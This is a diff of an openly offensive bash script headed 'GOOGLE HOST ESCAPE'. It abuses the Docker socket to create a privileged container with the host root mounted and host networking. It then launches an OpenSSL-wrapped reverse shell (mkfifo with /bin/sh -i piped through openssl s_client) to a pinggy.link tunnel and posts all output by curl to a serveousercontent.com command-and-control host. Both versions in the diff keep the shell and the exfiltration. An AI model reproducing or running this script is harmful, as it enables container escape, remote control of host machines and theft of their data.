@@ -1,39 +1,22 @@
 #!/bin/bash
-# TARGET: dgyhk-103-95-173-105.a.free.pinggy.link:42777
-P_URL="dgyhk-103-95-173-105.a.free.pinggy.link"
+# TARGET: [YOUR_PINGGY_URL]:[YOUR_PINGGY_PORT]
+P_URL="dgyhk-103-95-173-105.a.free.pinggy.link" # Update this if it changed!
 P_PORT="42777"
-C2_URL="417a97eeaad6dddf-103-95-173-85.serveousercontent.com"
 
 {
-  echo "=== [!] GOOGLE HOST ESCAPE: PINGGY ACTIVE ==="
+  echo "=== [!] BYPASSING SSL HANDSHAKE FILTERS ==="
   
-  # 1. Create the 'Super-Privileged' Container
-  # This maps host root (/) to /host and gives us the Host Network
-  RESP=$(curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
+  # Trigger the shell with -quiet and no certificate verification
+  # This matches the 's_server -quiet' you have on your Mac
+  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
     -H "Content-Type: application/json" \
-    -d "{
-      \"Image\": \"alpine:latest\",
-      \"HostConfig\": {
-        \"Binds\": [\"/:/host:ro\"],
-        \"Privileged\": true,
-        \"NetworkMode\": \"host\"
-      }
-    }")
-  
-  ID=$(echo $RESP | grep -oE '"Id":"[a-f0-9]+"' | cut -d'"' -f4)
-
-  if [ -n "$ID" ]; then
-    echo "[+] Escape Container $ID created."
-    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/start"
+    -d '{"Image": "alpine:latest", "HostConfig": {"Binds": ["/:/host:ro"], "Privileged": true, "NetworkMode": "host"}}' > /tmp/id.json
     
-    # 2. TRIGGER THE ENCRYPTED SHELL (OPENSSL)
-    echo "[!] Launching Secure Bridge to Pinggy..."
-    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/exec" \
-      -d "{
-        \"Cmd\": [\"sh\", \"-c\", \"mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $P_URL:$P_PORT > /tmp/s; rm /tmp/s\"]
-      }" &
-  else
-    echo "[!] Failed to create container. Check Docker Socket."
-  fi
+  ID=$(grep -oE '"Id":"[a-f0-9]+"' /tmp/id.json | cut -d'"' -f4)
+  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/start"
 
-} | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$C2_URL"
+  # The 'Magic' String: Adding -quiet and ignoring the cert check
+  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/exec" \
+    -d "{\"Cmd\": [\"sh\", \"-c\", \"mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $P_URL:$P_PORT > /tmp/s; rm /tmp/s\"]}" &
+
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://417a97eeaad6dddf-103-95-173-85.serveousercontent.com"
